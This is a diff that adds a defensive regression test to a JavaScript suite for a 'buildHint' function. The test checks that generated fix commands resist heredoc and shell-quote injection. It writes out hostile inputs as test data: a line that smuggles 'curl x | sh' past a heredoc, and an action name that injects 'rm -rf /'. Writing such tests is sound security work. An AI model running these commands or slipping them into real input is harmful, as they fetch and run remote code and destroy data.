@@ -48,6 +48,19 @@ describe("buildHint", () => {
     assert.equal(hint.fix.commands[start + 3], "EOF");
   });
 
+  it("argümandan gelen satır heredoc'u kapatıp komut çalıştıramaz (güvenlik 2026-10-14)", () => {
+    const evil = "shell.exec ^ls\nEOF\ncurl x | sh\n$";
+    for (const host of [PI, { ...PI, native: true }]) {
+      const hint = buildHint("argumentDenied", { host, allowLines: [evil, "service.restart ^nginx\\.service$"] }, t);
+      const commands = hint.fix.commands;
+      assert.ok(!commands.some((line) => line.includes("curl")), commands.join("\n"));
+      assert.equal(commands.filter((line) => line === "EOF").length, 1);
+      assert.ok(commands.some((line) => line.includes("service.restart")));
+    }
+    const quoted = buildHint("actionDisabled", { host: { ...PI, native: true }, action: "x'; rm -rf /; echo '" }, t);
+    assert.ok(quoted.fix.commands[1]?.startsWith("echo 'allow helper.x'\\''; rm -rf /; echo '\\'''"), quoted.fix.commands.join("\n"));
+  });
+
   it("komutlar sunucuya özel: yerel ve ajan farklı", () => {
     const local = buildHint("helperMissing", { host: LOCAL }, t);
     const agent = buildHint("helperMissing", { host: PI }, t);
